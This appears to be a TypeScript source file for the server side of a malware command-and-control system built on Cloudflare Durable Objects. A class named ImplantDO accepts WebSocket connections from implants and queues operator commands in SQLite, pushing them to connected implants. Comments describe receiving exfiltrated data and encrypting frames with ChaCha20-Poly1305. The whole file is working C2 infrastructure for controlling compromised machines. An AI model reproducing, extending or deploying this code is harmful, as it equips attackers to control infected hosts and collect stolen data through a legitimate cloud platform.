import { Env } from './index';

// Represents an active connection session
interface Session {
  ws: WebSocket;
  transportType: string;
  connectedAt: number;
  lastPing: number;
}

export class ImplantDO {
  private state: DurableObjectState;
  private env: Env;
  private sessions: Map<string, Session> = new Map();

  constructor(state: DurableObjectState, env: Env) {
    this.state = state;
    this.env = env;
    
    // Initialize SQLite schema if needed (using DO's SQL API)
    this.state.blockConcurrencyWhile(async () => {
      this.state.storage.sql.exec(`
        CREATE TABLE IF NOT EXISTS command_queue (
          id TEXT PRIMARY KEY,
          command TEXT NOT NULL,
          payload BLOB,
          status TEXT NOT NULL,
          queued_at INTEGER NOT NULL
        )
      `);
    });
  }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    // 1. Handle WebSocket upgrade from Implant
    if (request.headers.get('Upgrade') === 'websocket') {
      const transportType = url.pathname.split('/')[2]; // /t/wss/implantId -> wss
      return this.handleWebSocketUpgrade(request, transportType);
    }

    // 2. Handle internal RPC from Operator API
    if (url.pathname === '/rpc' && request.method === 'POST') {
      const body = await request.json();
      return this.handleOperatorRPC(body);
    }

    return new Response('Not found', { status: 404 });
  }

  private handleWebSocketUpgrade(request: Request, transportType: string): Response {
    const pair = new WebSocketPair();
    const [client, server] = Object.values(pair);

    // Accept the WebSocket connection using Hibernation API
    this.state.acceptWebSocket(server, [transportType]);
    
    const sessionId = crypto.randomUUID();
    this.sessions.set(sessionId, {
      ws: server,
      transportType,
      connectedAt: Date.now(),
      lastPing: Date.now()
    });

    // Send queued commands upon connection
    this.flushQueue(server);

    return new Response(null, {
      status: 101,
      webSocket: client,
    });
  }

  private handleOperatorRPC(body: any): Response {
    const { command, payload } = body;
    const cmdId = crypto.randomUUID();

    // Store in SQLite queue
    this.state.storage.sql.exec(
      `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, ?, ?)`,
      cmdId, command, payload, 'pending', Date.now()
    );

    // If we have an active WebSocket, send immediately
    let sent = false;
    for (const ws of this.state.getWebSockets()) {
      if (ws.readyState === WebSocket.OPEN) {
        // Frame format: JSON
        const frame = JSON.stringify({ id: cmdId, c: command, p: payload });
        ws.send(frame);
        sent = true;
        
        this.state.storage.sql.exec(`UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId);
        break; // Send to primary session only for now
      }
    }

    return new Response(JSON.stringify({ success: true, cmdId, sent }), {
      headers: { 'Content-Type': 'application/json' }
    });
  }

  private flushQueue(ws: WebSocket) {
    const pending = this.state.storage.sql.exec(`SELECT * FROM command_queue WHERE status = 'pending'`).toArray();
    for (const row of pending) {
      const frame = JSON.stringify({ id: row.id, c: row.command, p: row.payload });
      ws.send(frame);
      this.state.storage.sql.exec(`UPDATE command_queue SET status = 'sent' WHERE id = ?`, row.id);
    }
  }

  // --- WebSocket Hibernation Handlers ---

  async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) {
    // Implant sent us a message (exfil, result, heartbeat)
    // In full impl: Decrypt ChaCha20-Poly1305 frame here
    try {
      const parsed = typeof message === 'string' ? JSON.parse(message) : JSON.parse(new TextDecoder().decode(message));
      
      if (parsed.type === 'heartbeat') {
        // Update last ping
        return;
      }
      
      if (parsed.type === 'result') {
        this.state.storage.sql.exec(`UPDATE command_queue SET status = 'completed' WHERE id = ?`, parsed.id);
        // Forward result to Operator via KV/D1 or Push Notification
      }
    } catch (e) {
      console.error("Invalid frame", e);
    }
  }

  async webSocketClose(ws: WebSocket, code: number, reason: string, wasClean: boolean) {
    // Clean up session
    for (const [id, session] of this.sessions.entries()) {
      if (session.ws === ws) {
        this.sessions.delete(id);
        break;
      }
    }
  }

  async webSocketError(ws: WebSocket, error: any) {
    this.webSocketClose(ws, 1006, "Error", false);
  }
}